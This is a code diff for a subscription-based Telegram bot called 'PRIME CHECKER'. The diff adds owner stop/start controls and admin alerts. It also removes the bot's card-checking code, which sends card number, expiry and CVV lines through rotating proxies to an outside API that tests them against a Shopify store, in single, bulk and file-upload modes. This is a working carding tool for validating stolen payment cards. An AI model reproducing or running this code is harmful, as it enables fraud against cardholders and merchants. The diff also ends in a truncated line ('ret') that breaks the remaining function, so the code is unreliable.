@@ -5,6 +5,7 @@ import time
 import json
 import random
 import httpx
+import asyncio
 from telegram import Update
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
 from urllib.parse import quote
@@ -17,7 +18,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Render / Web Service Dummy HTTP Server to prevent 'Application exited early' error
+# Render Dummy HTTP Server
 class SimpleHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
@@ -34,6 +35,9 @@ TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 OWNER_USERNAME = "@ESCROW2929"
 AUTHORIZED_ADMINS = {8785590284}
 DATA_FILE = "users_data.json"
+
+# Bot Global State for Stop/Start
+BOT_IS_STOPPED = False
 
 # Complete Updated Proxy List
 PROXY_LIST = [
@@ -183,7 +187,19 @@ def parse_time_to_seconds(time_str):
         pass
     return 86400
 
+# Middleware to check if bot is stopped
+async def check_bot_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
+    global BOT_IS_STOPPED
+    if BOT_IS_STOPPED:
+        user_id = update.effective_user.id
+        if not is_main_admin(user_id):
+            await update.message.reply_text("⛔ **Bot is currently offline/stopped by the Owner!** Please wait until it is restarted.")
+            return False
+    return True
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await check_bot_status(update, context):
+        return
     user_id = update.effective_user.id
     if user_id in BANNED_USERS:
         await update.message.reply_text("❌ You are banned from using this bot.")
@@ -202,7 +218,34 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"👑 Owner: {OWNER_USERNAME}"
     )
 
+# Stop & StartAll commands for Owner
+async def stop_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_main_admin(user_id):
+        return
+    global BOT_IS_STOPPED
+    BOT_IS_STOPPED = True
+    await update.message.reply_text(
+        "🛑 **BOT STOPPED SUCCESSFULLY!** 🛑\n\n"
+        "• All user requests and card checking are now paused.\n"
+        "• Only the Owner can use commands.\n"
+        "• Use /startall to resume the bot operations."
+    )
+
+async def start_all_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_main_admin(user_id):
+        return
+    global BOT_IS_STOPPED
+    BOT_IS_STOPPED = False
+    await update.message.reply_text(
+        "🟢 **BOT RESUMED & STARTED SUCCESSFULLY!** 🟢\n\n"
+        "• All features and user commands are now active again."
+    )
+
 async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await check_bot_status(update, context):
+        return
     user_id = update.effective_user.id
     if not is_any_admin(user_id):
         await update.message.reply_text("❌ You are not authorized to use the Admin Panel.")
@@ -210,6 +253,7 @@ async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     panel_message = (
         f"🛠 Admin Panel & Controls\n\n"
         f"• Gateway: Shopify API Connected ✅\n"
+        f"• Bot Status: {'🔴 Stopped' if BOT_IS_STOPPED else '🟢 Running'}\n"
         f"• Total Proxies Loaded: {len(PROXY_LIST)}\n"
         f"• Total Active Users Tracked: {len(ALL_USERS)}\n"
         f"• Total Keys in System: {len(ACTIVE_KEYS)}\n"
@@ -218,6 +262,8 @@ async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"Available Commands:\n"
         f"/key <quantity> <time> (e.g., /key 25 1d)\n"
         f"/keyreset (Reset all keys)\n"
+        f"/stop (Stop bot operations)\n"
+        f"/startall (Resume bot operations)\n"
         f"/users (To see all users)\n"
         f"/announcement <message>\n"
     )
@@ -226,6 +272,8 @@ async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(panel_message)
 
 async def show_users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await check_bot_status(update, context):
+        return
     user_id = update.effective_user.id
     if not is_any_admin(user_id):
         await update.message.reply_text("❌ Unauthorized.")
@@ -233,12 +281,11 @@ async def show_users_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
     users_list = list(ALL_USERS)
     users_text = "\n".join([str(uid) for uid in users_list[:50]])
     response = f"👥 **Total Tracked Users:** {len(ALL_USERS)}\n\nFirst 50 User IDs:\n{users_text}"
-    if len(response) > 4000:
-        await update.message.reply_text(f"👥 Total Tracked Users: {len(ALL_USERS)}")
-    else:
-        await update.message.reply_text(response, parse_mode="Markdown")
+    await update.message.reply_text(response, parse_mode="Markdown")
 
 async def announcement_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await check_bot_status(update, context):
+        return
     user_id = update.effective_user.id
     if not is_any_admin(user_id):
         await update.message.reply_text("❌ You are not authorized.")
@@ -262,6 +309,8 @@ async def announcement_command(update: Update, context: ContextTypes.DEFAULT_TYP
     )
 
 async def generate_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await check_bot_status(update, context):
+        return
     user_id = update.effective_user.id
     if not is_any_admin(user_id):
         await update.message.reply_text("❌ Unauthorized.")
@@ -291,6 +340,8 @@ async def generate_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(response_msg, parse_mode="Markdown")
 
 async def key_reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await check_bot_status(update, context):
+        return
     user_id = update.effective_user.id
     if not is_any_admin(user_id):
         await update.message.reply_text("❌ Unauthorized.")
@@ -300,16 +351,21 @@ async def key_reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     USER_SUBSCRIPTIONS.clear()
     save_data()
     
-    # Notify Owner
+    # Notify Owner about key reset
     for admin_id in AUTHORIZED_ADMINS:
         try:
-            await context.bot.send_message(chat_id=admin_id, text=f"⚠️ Notice: All keys have been reset by Admin ID: {user_id}")
+            await context.bot.send_message(
+                chat_id=admin_id,
+                text=f"⚠️ **KEY RESET ALERT!**\n\nAll active keys and subscriptions have been completely reset by Admin ID: `{user_id}`"
+            )
         except Exception:
             pass
             
     await update.message.reply_text("✅ All keys and subscriptions have been successfully reset.")
 
 async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await check_bot_status(update, context):
+        return
     user = update.effective_user
     user_id = user.id
     user_name = user.full_name or user.username or "Unknown"
@@ -337,12 +393,18 @@ async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     USER_SUBSCRIPTIONS[user_id] = expiry_timestamp
     save_data()
     
-    # Notify Owner about key usage
+    # Notify Owner about key usage with user details
     for admin_id in AUTHORIZED_ADMINS:
         try:
             await context.bot.send_message(
                 chat_id=admin_id,
-                text=f"🔑 **Key Redeemed Alert!**\n\n• Key: `{user_key}`\n• User Name: {user_name}\n• User ID: `{user_id}`"
+                text=(
+                    f"🔑 **Key Redeemed Alert!**\n\n"
+                    f"• Key Used: `{user_key}`\n"
+                    f"• User Name: {user_name}\n"
+                    f"• User ID: `{user_id}`\n"
+                    f"• Profile Link: tg://user?id={user_id}"
+                )
             )
         except Exception:
             pass
@@ -409,250 +471,4 @@ def has_access(user_id):
             del USER_SUBSCRIPTIONS[user_id]
             save_data()
             return False
-    return False
-
-async def get_bin_info(bin_code):
-    try:
-        async with httpx.AsyncClient(timeout=10.0) as client:
-            res = await client.get(f"https://lookup.binlist.net/{bin_code}")
-            if res.status_code == 200:
-                data = res.json()
-                scheme = data.get("scheme", "UNKNOWN").upper()
-                type_val = data.get("type", "UNKNOWN").upper()
-                brand = data.get("brand", "").upper()
-                bank_name = data.get("bank", {}).get("name", "UNKNOWN").upper()
-                country_name = data.get("country", {}).get("name", "UNKNOWN").upper()
-                country_emoji = data.get("country", {}).get("emoji", "")
-                bin_desc = f"{scheme} - {type_val}"
-                if brand:
-                    bin_desc += f" - {brand}"
-                return bin_desc, bank_name, f"{country_name} {country_emoji}"
-    except Exception:
-        pass
-    return "UNKNOWN - UNKNOWN", "UNKNOWN", "UNKNOWN"
-
-async def process_card_string(card_line, user_full_name):
-    try:
-        parts = card_line.split('|')
-        if len(parts) < 4:
-            return f"❌ {card_line} ➔ Invalid Format"
-        
-        cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
-        formatted_cc = f"{cc}|{mes}|{ano}|{cvv}"
-        full_card_display = f"{cc}|{mes}|{ano}|{cvv}"
-        bin_code = cc[:6]
-        
-        bin_info, bank_info, country_info = await get_bin_info(bin_code)
-        
-        site_url = "https://customsbyarrillc.myshopify.com"
-        selected_proxy = random.choice(PROXY_LIST)
-        
-        api_url = f"http://rhaenyra.xyz/shopify?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxy)}"
-        
-        # 120 Seconds Timeout implemented here
-        async with httpx.AsyncClient(timeout=80.0, follow_redirects=True) as client:
-            try:
-                response = await client.get(api_url)
-                if response.status_code != 200:
-                    return f"❌ {card_line} ➔ API Server Error (Status Code: {response.status_code})"
-                
-                try:
-                    res_data = response.json()
-                except json.JSONDecodeError:
-                    return f"❌ {card_line} ➔ API Error: Invalid response format from server."
-                    
-            except httpx.TimeoutException:
-                return f"❌ {card_line} ➔ API Timeout (Server took too long to respond)"
-            except httpx.RequestError as req_err:
-                return f"❌ {card_line} ➔ Connection Failed: {str(req_err)}"
-        
-        resp_status = res_data.get("Response", "UNKNOWN")
-        price = res_data.get("Price", "$14.97")
-        gate = res_data.get("Gate", "Shopify Payments")
-        approved = str(res_data.get("Approved", "False"))
-        charged = str(res_data.get("Charged", "False"))
-        
-        is_success = (approved.lower() == "true" or charged.lower() == "true" or "approved" in resp_status.lower() or "success" in resp_status.lower())
-        hit_title = "⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!" if is_success else "❌💠 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝!"
-        
-        return (
-            f"⚡💳  # PRIME CHECKER  💳⚡\n"
-            f"━━━━━━━━━━━━━━━━━\n"
-            f"{hit_title}\n"
-            f"⚠️ Status: {resp_status}\n"
-            f"💳 Card: {full_card_display}\n"
-            f"📝 Response: {resp_status}\n"
-            f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gate} | 💰 {price}\n"
-            f"━━━━━━━━━━━━━━━━━\n"
-            f"🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨\n"
-            f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info}\n"
-            f"𝗕𝗮𝗻𝗸: {bank_info}\n"
-            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
-            f"━━━━━━━━━━━━━━━━━\n"
-            f"👤 Cʜᴇᴄᴋᴇᴅ Bʏ ➠ {user_full_name}\n"
-            f"🤖 Bot By: PRIME, SIMPLE BOY, SHINCHAN"
-        )
-            
-    except Exception as e:
-        logger.error(f"Critical processing error: {str(e)}")
-        return f"❌ {card_line} ➔ Internal Error occurred while processing."
-
-async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id in BANNED_USERS:
-        return
-    ALL_USERS.add(user_id)
-    save_data()
-    if not has_access(user_id):
-        await update.message.reply_text("❌ Subscription expired or no key redeemed. Use /redeem <key>.")
-        return
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /chk CC|MM|YY|CVV")
-        return
-    card_line = " ".join(context.args)
-    user_full_name = update.effective_user.first_name
-    
-    msg = await update.message.reply_text("⏳ Processing card...")
-    result = await process_card_string(card_line, user_full_name)
-    await context.bot.edit_message_text(
-        chat_id=update.effective_chat.id,
-        message_id=msg.message_id,
-        text=result
-    )
-
-async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id in BANNED_USERS:
-        return
-    ALL_USERS.add(user_id)
-    save_data()
-    if not has_access(user_id):
-        await update.message.reply_text("❌ Subscription expired or no key redeemed. Use /redeem <key>.")
-        return
-    
-    text_input = update.message.text
-    # Remove command prefix /chks
-    cards_text = text_input.replace("/chks", "").strip()
-    if not cards_text:
-        await update.message.reply_text("❌ Usage: /chks card1\ncard2\ncard3...")
-        return
-        
-    card_lines = [line.strip() for line in cards_text.split("\n") if line.strip()]
-    if not card_lines:
-        await update.message.reply_text("❌ No cards found in input.")
-        return
-        
-    # Limit bulk checking to prevent timeout/spam (e.g. max 10 cards)
-    if len(card_lines) > 10:
-        card_lines = card_lines[:10]
-        await update.message.reply_text("⚠️ Maximum 10 cards allowed per bulk request. Processing first 10...")
-
-    user_full_name = update.effective_user.first_name
-    status_msg = await update.message.reply_text(f"⏳ Processing {len(card_lines)} cards in bulk...")
-
-    results = []
-    for line in card_lines:
-        res = await process_card_string(line, user_full_name)
-        results.append(res)
-        
-    final_output = "\n\n".join(results)
-    if len(final_output) > 4000:
-        final_output = final_output[:4000] + "\n\n[Truncated due to Telegram length limit]"
-
-    await context.bot.edit_message_text(
-        chat_id=update.effective_chat.id,
-        message_id=status_msg.message_id,
-        text=final_output
-    )
-
-async def chf_file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id in BANNED_USERS:
-        return
-    ALL_USERS.add(user_id)
-    save_data()
-    if not has_access(user_id):
-        await update.message.reply_text("❌ Subscription expired or no key redeemed. Use /redeem <key>.")
-        return
-        
-    document = update.message.document
-    if not document:
-        await update.message.reply_text("❌ Please upload a text file containing cards using /chf caption or reply.")
-        return
-        
-    status_msg = await update.message.reply_text("⏳ Downloading and processing file...")
-    try:
-        file = await context.bot.get_file(document.file_id)
-        file_bytes = await file.download_as_bytearray()
-        file_content = file_bytes.decode("utf-8", errors="ignore")
-        
-        card_lines = [line.strip() for line in file_content.split("\n") if line.strip() and "|" in line]
-        if not card_lines:
-            await update.message.reply_text("❌ No valid card lines found in the uploaded file.")
-            return
-            
-        if len(card_lines) > 10:
-            card_lines = card_lines[:10]
-            await context.bot.edit_message_text(
-                chat_id=update.effective_chat.id,
-                message_id=status_msg.message_id,
-                text=f"⚠️ File has many cards. Processing first 10 cards..."
-            )
-        else:
-            await context.bot.edit_message_text(
-                chat_id=update.effective_chat.id,
-                message_id=status_msg.message_id,
-                text=f"⏳ Processing {len(card_lines)} cards from file..."
-            )
-
-        user_full_name = update.effective_user.first_name
-        results = []
-        for line in card_lines:
-            res = await process_card_string(line, user_full_name)
-            results.append(res)
-            
-        final_output = "\n\n".join(results)
-        if len(final_output) > 4000:
-            final_output = final_output[:4000] + "\n\n[Truncated]"
-
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text=final_output
-        )
-    except Exception as e:
-        logger.error(f"File processing error: {str(e)}")
-        await update.message.reply_text("❌ Error processing the uploaded file.")
-
-def main():
-    if not TOKEN:
-        logger.error("TELEGRAM_BOT_TOKEN environment variable is missing!")
-        return
-
-    # Start dummy HTTP server in background thread for Render
-    server_thread = threading.Thread(target=run_server)
-    server_thread.daemon = True
-    server_thread.start()
-
-    application = ApplicationBuilder().token(TOKEN).build()
-
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("admin", admin_pannel))
-    application.add_handler(CommandHandler("users", show_users_command))
-    application.add_handler(CommandHandler("announcement", announcement_command))
-    application.add_handler(CommandHandler("key", generate_key))
-    application.add_handler(CommandHandler("keyreset", key_reset_command))
-    application.add_handler(CommandHandler("redeem", redeem_key))
-    application.add_handler(CommandHandler("makeadmin", make_admin))
-    application.add_handler(CommandHandler("removeadmin", remove_admin))
-    application.add_handler(CommandHandler("ban", ban_user))
-    application.add_handler(CommandHandler("unban", unban_user))
-    application.add_handler(CommandHandler("chk", chk_card))
-    application.add_handler(CommandHandler("chks", chks_cards))
-    application.add_handler(CommandHandler("chf", chf_file_check))
-    application.add_handler(MessageHandler(filters.Document.ALL, chf_file_check))
-
-    logger.info("Bot is starting polling...")
-    application.run_polling()
-
-if __name__ == "__main__":
-    main()
+    ret
